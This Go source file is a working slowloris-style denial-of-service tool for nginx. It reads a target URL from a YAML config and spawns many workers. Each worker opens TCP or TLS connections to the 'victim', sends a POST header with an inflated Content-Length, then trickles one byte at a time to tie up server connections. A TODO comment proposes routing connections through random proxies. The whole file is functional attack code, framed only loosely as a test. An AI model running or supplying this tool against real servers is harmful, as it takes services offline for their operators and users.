// Goloris - slowloris[1] for nginx.
//
// The original source code is available at http://github.com/valyala/goloris.
//
package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"gopkg.in/yaml.v2"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/url"
	"runtime"
	"strings"
	"time"
)

type Configuration struct {
	URL              string `yaml:"URL"`
	DialWorkersCount int    `yaml:"dial_count_workers"`
	TestDuration     string `yaml:"test_duration"`
	SleepInterval    string `yaml:"sleep_interval"`
}

var (
	Config        Configuration
	SleepInterval time.Duration
	TestDuration  time.Duration
	pathConfig    string

	sharedReadBuf  = make([]byte, 4096)
	sharedWriteBuf = []byte("A")

	hostname string
)

func init() {
	flag.StringVar(&pathConfig, "c", "conf.yml", "Configuration file for proxy-auth module")
	flag.Parse()
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	var err error
	if err = LoadConfig(); err != nil {
		log.Fatalf("Error loading configuration file:", err.Error())
	}
	if SleepInterval, err = time.ParseDuration(Config.SleepInterval); err != nil {
		log.Fatalf("Cannot parse sleep_interval=[%s]: [%s]\n", Config.SleepInterval, err)
	}
	if TestDuration, err = time.ParseDuration(Config.TestDuration); err != nil {
		log.Fatalf("Cannot parse test_duration=[%s]: [%s]\n", Config.TestDuration, err)
	}
	log.Printf("Starting...\n")
	log.Printf("URL: %v\n", Config.URL)
	log.Printf("Count workers: %v\n", Config.DialWorkersCount)
	log.Printf("Sleep interval: %v\n", SleepInterval)
	log.Printf("Test duration: %v\n", TestDuration)
	victimUri, err := url.Parse(Config.URL)
	if err != nil {
		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", time.Second, err)
	}
	victimHostPort := victimUri.Host
	if !strings.Contains(victimHostPort, ":") {
		port := "80"
		if victimUri.Scheme == "https" {
			port = "443"
		}
		victimHostPort = net.JoinHostPort(victimHostPort, port)
	}
	hostname = victimUri.Host
	host := victimUri.Host
	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Length: 64000\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\n\n",
		victimUri.RequestURI(), host))

	activeConnectionsCh := make(chan int, Config.DialWorkersCount)
	go activeConnectionsCounter(activeConnectionsCh)
	for i := 0; i < Config.DialWorkersCount; i++ {
		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
	}
	time.Sleep(time.Duration(TestDuration))
}

func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
	isTls := (victimUri.Scheme == "https")

	for {
		conn := dialVictim(victimHostPort, isTls)
		if conn != nil {
			go doLoris(conn, activeConnectionsCh, requestHeader)
		}
	}
}

func activeConnectionsCounter(ch <-chan int) {
	var connectionsCount int
	for n := range ch {
		connectionsCount += n
		log.Printf("Holding %d connections\n", connectionsCount)
	}
}

func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
	// TODO hint: add support for dialing the victim via a random proxy
	// from the given pool.
	conn, err := net.Dial("tcp", hostPort)
	if err != nil {
		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}
	tcpConn := conn.(*net.TCPConn)
	if err = tcpConn.SetReadBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
	}
	if err = tcpConn.SetWriteBuffer(128); err != nil {
		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
	}
	if err = tcpConn.SetLinger(0); err != nil {
		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
	}
	if !isTls {
		return tcpConn
	}
	tlsConn := tls.Client(conn, &tls.Config{
		PreferServerCipherSuites: true,
		InsecureSkipVerify:       true,
		MinVersion:               tls.VersionTLS11,
		MaxVersion:               tls.VersionTLS11,
		ServerName:               hostname,
	})
	if err = tlsConn.Handshake(); err != nil {
		conn.Close()
		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
		return nil
	}
	return tlsConn
}

func doLoris(conn io.ReadWriteCloser, activeConnectionsCh chan<- int, requestHeader []byte) {
	defer conn.Close()

	if _, err := conn.Write(requestHeader); err != nil {
		log.Printf("Cannot write requestHeader=[%v]: [%s]\n", requestHeader, err)
		return
	}

	activeConnectionsCh <- 1
	defer func() { activeConnectionsCh <- -1 }()

	readerStopCh := make(chan int, 1)
	go nullReader(conn, readerStopCh)

	for i := 0; i < 4096; i++ {
		select {
		case <-readerStopCh:
			return
		default:
			time.Sleep(SleepInterval)
		}
		if _, err := conn.Write(sharedWriteBuf); err != nil {
			log.Printf("Error when writing %d byte out of %d bytes: [%s]\n", i, 4096, err)
			return
		}
	}
}

func nullReader(conn io.Reader, ch chan<- int) {
	defer func() { ch <- 1 }()
	n, err := conn.Read(sharedReadBuf)
	if err != nil {
		log.Printf("Error when reading server response: [%s]\n", err)
	} else {
		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
	}
}

func LoadConfig() error {
	bytes, err := ioutil.ReadFile(pathConfig)
	if err != nil {
		return err
	}
	err = yaml.Unmarshal(bytes, &Config)
	if err != nil {
		return err
	}
	return nil
}
